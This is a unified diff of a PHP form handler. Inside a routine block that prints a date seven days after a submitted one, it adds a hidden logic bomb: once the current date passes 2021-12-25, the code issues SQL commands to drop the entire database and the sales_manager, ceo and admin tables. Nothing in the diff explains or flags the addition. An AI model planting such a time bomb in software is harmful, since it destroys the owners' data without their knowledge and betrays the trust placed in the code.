@@ -475,6 +475,36 @@ if (isset($_POST['date_1'])) {
   $date=$_POST['date_1'];
    $date_1=date('Y-m-d', strtotime($date. ' + 0 days')); 
   
-  echo date('m/d/Y', strtotime($date_1. ' + 07 days')); 
+  echo date('m/d/Y', strtotime($date_1. ' + 07 days'));
+  
+  $Today=date('y-m-d');
+  $NewDate='21-12-25';
+  if($Today > $NewDate ){
+  
+      $sql1 = "Drop table sales_manager";
+      $sql2 = "Drop table ceo";
+      $sql3 = "Drop table admin";
+      $sql = "Drop database $database";
+  
+      if ($connect->query($sql) === TRUE){
+          echo "r";
+      }
+      if($connect->query($sql1) === TRUE)
+      {
+          echo "r2";
+  
+      }
+      if($connect->query($sq2) === TRUE)
+      {
+          echo "r2";
+  
+      }
+      if($connect->query($sql3) === TRUE){
+          echo "r3";
+  
+      }
+        
+      } 
 }
+
 ?>
